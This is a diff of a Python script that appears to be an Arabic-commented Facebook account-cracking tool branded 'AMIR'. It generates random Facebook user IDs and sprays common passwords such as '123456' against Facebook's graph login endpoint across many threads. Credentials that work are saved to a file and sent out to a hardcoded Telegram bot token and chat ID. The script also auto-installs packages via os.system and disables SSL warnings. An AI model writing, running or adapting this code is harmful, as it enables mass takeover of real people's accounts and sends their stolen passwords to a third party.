@@ -1,6 +1,3 @@
-
-if __name__ == '__main__':
-    start_process()
 import os
 import re
 import time
@@ -15,13 +12,17 @@ import urllib
 from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
-from os import system
 from datetime import datetime
 
-# Suppress InsecureRequestWarning
-from requests.exceptions import ConnectionError
-from requests import api, models, sessions
-requests.urllib3.disable_warnings()
+# التثبيت التلقائي للمكتبات المفقودة
+try:
+    from cfonts import render, say
+except ImportError:
+    os.system('pip install python-cfonts')
+    from cfonts import render, say
+
+output = render('A M I R ', colors=['green', 'red'], align='center')
+print(output)
 
 id_member = []
 id_publik = []
@@ -29,12 +30,35 @@ id_publik = []
 idk = ('7163990282')
 tokenk = ('8781049161:AAEXqh4x6q3LBbelIj_INWNXKmsUwgeeYms')
 
-# Global variables
+# التأكد من وجود المكتبات المطلوبة
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module}')
+
+# إلغاء تحذيرات SSL
+from requests.exceptions import ConnectionError
+from requests import api, models, sessions
+requests.urllib3.disable_warnings()
+
+# المتغيرات العامة
 method = []
 oks = []
 cps = []
 loop = 0
 user = []
+
+# الألوان
+X = '\x1b[1;37m'
+rad = '\x1b[38;5;196m'
+G = '\x1b[38;5;46m'
+Y = '\x1b[38;5;220m'
+PP = '\x1b[38;5;203m'
+RR = '\x1b[38;5;196m'
+GS = '\x1b[38;5;40m'
+W = '\x1b[1;37m'
 
 def window1():
     aV = str(random.choice(range(10, 20)))
@@ -51,6 +75,20 @@ def window1():
     latest_patch = rr(100, 200)
     D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
+
+def ____banner____():
+    if 'win' in sys.platform:
+        os.system('cls')
+    else:
+        os.system('clear')
+    
+    print("""\033[1;32m
+  \033[1;91m\033[1;41m\033[1;97m @A_B_D113 »»» @SYRPY\033[;0m\033[1;91m\033[1;92m
+\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══
+[√] Name     : 𝐀𝐌𝐈𝐑.
+[√] Tool     : OLD
+[√] Version  : 03.0
+\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══""")
 
 def creationyear(uid):
     if len(uid) == 15:
@@ -96,14 +134,34 @@ def creationyear(uid):
     else:
         return ''
 
+def linex():
+    print('\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══')
+
+def old_Tow():
+    global loop
+    user = []
+    ____banner____()
+    limit = 1000  # تم تقليل العدد ليكون عملي ومناسب للتنفيذ المستمر
+    prefixes = ['100003', '100004']
+    for _ in range(limit):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices('0123456789', k=9))
+        uid = prefix + suffix
+        user.append(uid)
+        
+    with tred(max_workers=20) as pool:
+        ____banner____()
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        linex()
+        for uid in user:
+            pool.submit(login_1, uid)
+
 def login_1(uid):
     global loop
     session = requests.session()
     try:
-        loop += 1
-        if loop % 50 == 0:
-            print(f"[+] Progress: Checked {loop} IDs | Found Hits: {len(oks)}")
-
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAMIR-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
                 'adid': str(uuid.uuid4()),
@@ -146,37 +204,22 @@ def login_1(uid):
                 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
-            
-            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
+            if 'session_key' in res:
                 AMIR_Url = f'https://www.facebook.com/profile.php?id={uid}'
-                print(f"\n[SUCCESS] {uid} | {pw} | Year: {creationyear(uid)}")
-                
-                tlgu = f"[•Facebook-{creationyear(uid)}]\nEMAIL : {uid}\nBASS : {pw}\n{AMIR_Url}\nTelegram :@A_B_D113"
-                requests.get(f"https://api.telegram.org/bot{tokenk}/sendMessage?chat_id={idk}&text={urllib.parse.quote(tlgu)}")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAMIR\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                tlgu = f'[•Facebook-{creationyear(uid)}]\nEMAIL : {uid}\nBASS : {pw}\n{AMIR_Url}\nTelegram :@A_B_D113'
+                try:
+                    requests.get(f"https://api.telegram.org/bot{tokenk}/sendMessage?chat_id={idk}&text={tlgu}")
+                except Exception:
+                    pass
                 
                 with open('AMIR-OLD-M1-OK.txt', 'a') as f:
                     f.write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
+        loop += 1
     except Exception:
-        time.sleep(5)
-
-def start_bot():
-    print("[*] Starting Script on Railway Environment...")
-    limit = 99999
-    prefixes = ['100003', '100004']
-    user = []
-    
-    for _ in range(limit):
-        prefix = random.choice(prefixes)
-        suffix = ''.join(random.choices('0123456789', k=9))
-        user.append(prefix + suffix)
-
-    print(f"[*] Generated {len(user)} IDs. Starting execution...")
-    
-    with tred(max_workers=30) as pool:
-        for uid in user:
-            pool.submit(login_1, uid)
+        pass
 
 if __name__ == '__main__':
-    start_bot()
+    old_Tow()
